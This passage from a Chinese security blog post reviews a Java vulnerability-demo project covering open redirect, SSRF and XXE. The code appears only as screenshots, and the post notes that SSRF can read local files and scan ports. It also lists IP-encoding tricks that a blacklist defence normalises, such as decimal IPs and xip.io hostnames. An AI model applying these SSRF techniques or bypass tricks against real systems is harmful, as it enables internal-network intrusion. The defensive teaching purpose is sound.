<p><img src="https://i.loli.net/2020/04/17/76lpjtNH1gC8FnR.png" alt="Snipaste_2020-04-17_15-40-21.png"></p>
<p>上面是3种重定向的代码，但是由于没有对重定向的url进行检查，导致url重定向漏洞，跳转到一个攻击者控制的网站，可能导致跳转过去的用户被精心设置的钓鱼页面骗走自己的个人信息    和登录口令 。</p>
<p><strong>漏洞测试</strong></p>
<p>跳转到任意页面</p>
<p><strong>漏洞修复</strong></p>
<p><img src="https://i.loli.net/2020/04/17/qbe53o7kQp41BvX.png" alt="Snipaste_2020-04-17_15-44-55.png"></p>
<p><img src="https://i.loli.net/2020/04/17/5v3ibeJfCIFSsRE.png" alt="Snipaste_2020-04-17_15-46-52.png"></p>
<p><img src="https://i.loli.net/2020/04/17/25ipgXJv9fWNqCa.png" alt="Snipaste_2020-04-17_15-47-25.png"></p>
<p>设置白名单和黑名单校验</p>
<h4><span id="ssrf">SSRF</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/PJye8kzFMCfWX3I.png" alt="Snipaste_2020-04-17_15-53-52.png"></p>
<p><img src="https://i.loli.net/2020/04/17/h5GNtI47vFVcU9S.png" alt="Snipaste_2020-04-17_15-57-44.png"></p>
<p>相对于php，在java中SSRF的利用局限较大，一般利用http协议来探测端口，利用file协议读取任意文件。 </p>
<p><strong>漏洞测试</strong></p>
<p>读文件</p>
<p><img src="https://i.loli.net/2020/04/17/7wjmLtNqfzF8eAy.png" alt="Snipaste_2020-04-17_16-16-22.png"></p>
<p>还可以端口扫描</p>
<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/Tq4vabdyBhRGtIz.png" alt="Snipaste_2020-04-17_16-17-27.png"></p>
<p>首先限制了<code>http/https</code>协议，使用<code>ssrfHook()</code></p>
<p><img src="https://i.loli.net/2020/04/17/cmvGCogxUksZW2B.png" alt="Snipaste_2020-04-17_16-18-31.png"></p>
<p><img src="https://i.loli.net/2020/04/17/KDuYZwzsULd2INW.png" alt="Snipaste_2020-04-17_16-28-59.png"></p>
<p>跟进<code>initSocketImpl()</code></p>
<p><img src="https://i.loli.net/2020/04/17/AU1vOecfSJFiHs9.png" alt="Snipaste_2020-04-17_16-38-51.png"></p>
<p><img src="https://i.loli.net/2020/04/17/KDw1sekqQrjd5ag.png" alt="Snipaste_2020-04-17_16-39-36.png"></p>
<p><img src="https://i.loli.net/2020/04/17/bCmIWagrAhcPotj.png" alt="Snipaste_2020-04-17_16-40-10.png"></p>
<p>上面是一部分ssrf检查的代码，总体是从黑名单的角度来防止ssrf，现在一些业务也可以限制域名白名单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">从URL中获取host，限制为http&#x2F;https协议。只支持http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;，不支持&#x2F;&#x2F;的http协议。</span><br><span class="line">host转换为IP</span><br><span class="line">     * 会将各种进制的ip转为正常ip</span><br><span class="line">     * 167772161转换为10.0.0.1</span><br><span class="line">     * 127.0.0.1.xip.io转换为127.0.0.1</span><br><span class="line">使用SubnetUtils库判断ip是否在内网网段</span><br><span class="line">     *</span><br><span class="line">     * @param strIP ip字符串</span><br><span class="line">     * @return 如果是内网ip，返回true，否则返回false。</span><br><span class="line">判断一个URL的IP是否是内网IP</span><br><span class="line">解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。</span><br><span class="line">     * url只允许https或者http，并且设置默认连接超时时间。</span><br><span class="line">     * 该修复方案会主动请求重定向后的链接。最好用Hook方式获取到所有url后，进行判断</span><br></pre></td></tr></table></figure>

<h4><span id="xxe">XXE</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/awOIF8qu6XJxLz7.png" alt="Snipaste_2020-04-17_16-45-22.png"></p>
<p><img src="https://i.loli.net/2020/04/17/u2hKDpBiXCmnGF7.png" alt="Snipaste_2020-04-17_16-46-18.png"></p>
<p><img src="https://i.loli.net/2020/04/17/1ds9DaNuonByItq.png" alt="Snipaste_2020-04-17_16-46-54.png"></p>
<p><img src="https://i.loli.net/2020/04/17/39lYEVPHnAS8bN2.png" alt="Snipaste_2020-04-17_16-47-08.png"></p>
<p><img src="https://i.loli.net/2020/04/17/6iT4ebqNMVL2Hk7.png" alt="Snipaste_2020-04-17_16-47-18.png"></p>
<p>解析xml的对象没有正确配置导致XXE</p>
<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/Qr9ymMRl872ifpK.png" alt="Snipaste_2020-04-17_16-45-58.png"></p>
<p>后面几个也差不多，正确配置可以防止XXE。</p>
<h4><span id="总结">总结</span></h4><p>这个项目看的比较快，主要是一些java可能出现的基础漏洞，不过在学习的过程中找到一些好文章。</p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/04/18/jenkins-2-101-XStream-rce%E5%88%86%E6%9E%90/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">jenkins-2.101-XStream rce分析</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/04/14/ysoserial-CommonsCollections%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/">
        <span class="next-text nav-default">ysoserial-CommonsCollections系列学习</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
